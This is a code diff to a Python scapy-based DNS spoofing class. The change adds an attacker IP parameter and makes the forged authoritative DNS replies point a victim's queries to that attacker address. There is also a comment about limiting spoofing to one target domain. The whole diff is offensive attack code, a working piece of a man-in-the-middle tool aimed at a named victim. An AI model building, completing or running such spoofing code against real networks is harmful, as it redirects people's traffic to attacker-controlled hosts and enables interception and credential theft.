@@ -4,8 +4,9 @@ from scapy.layers.inet import IP, UDP
 from logger import log_info, log_warning
 
 class DNSSpoofer:
-    def __init__(self, interface, ip_victim, ip_to_spoof):
+    def __init__(self, interface, ip_attacker, ip_victim, ip_to_spoof):
         self.interface = interface
+        self.ip_attacker = ip_attacker
         self.ip_victim = ip_victim
         self.ip_to_spoof = ip_to_spoof
 
@@ -25,6 +26,7 @@ class DNSSpoofer:
             packet.haslayer(DNSQR)
             and packet[DNS].qr == 0
             and packet[IP].src == self.ip_victim
+            # TODO: Only do this for packets related to ip_to_spoof
         ):
             log_info(
                 "Received DNS query for {} from {}".format(
@@ -40,7 +42,7 @@ class DNSSpoofer:
                     qd=packet[DNS].qd,
                     aa=1,
                     qr=1,
-                    an=DNSRR(rrname=packet[DNSQR].qname, rdata=self.ip_to_spoof),
+                    an=DNSRR(rrname=packet[DNSQR].qname, rdata=self.ip_attacker),
                 )
             )
 
